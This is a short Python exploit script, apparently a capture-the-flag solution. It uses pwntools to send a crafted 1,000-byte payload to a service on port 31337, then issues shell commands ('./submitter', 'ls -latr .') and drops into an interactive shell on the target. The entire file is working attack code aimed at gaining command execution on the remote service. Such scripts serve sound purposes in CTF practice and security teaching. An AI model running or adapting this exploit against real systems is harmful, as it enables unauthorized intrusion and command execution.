#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

def add(s, i):
    return bytes([(c+i)%256 for c in s])
ar = [b'\x00'*10] * 100
ar[0] = b'\x33'*10
nb = 1
ci = (0x3333 + 1) % 100
for i in range(1, 80):
    ar[ci] = add(b'\x04fUzZ\x00tHiS', nb)
    nb += 1
    ci = (ci + 1) % 100
#ar[ci] = add(b'\x04fUzZ\x00tHiS', 2)
#ci = (ci + 1) % 100
#ar[ci] = add(b'\x04fUzZ\x00tHiS', 3)
#ci = (ci + 1) % 100
ar[ci] = add(b'\x80' + b'\x00\x00\x00\x80'*2 + b'\x00', nb)
nb += 1

io = remote(HOST, int(PORT))
#io = process('challenge.py')
io.send(b''.join(ar))
print(io.recvrepeat(3))
io.sendline('./submitter')
io.sendline('ls -latr .')
print(io.recvrepeat(3))
io.interactive()
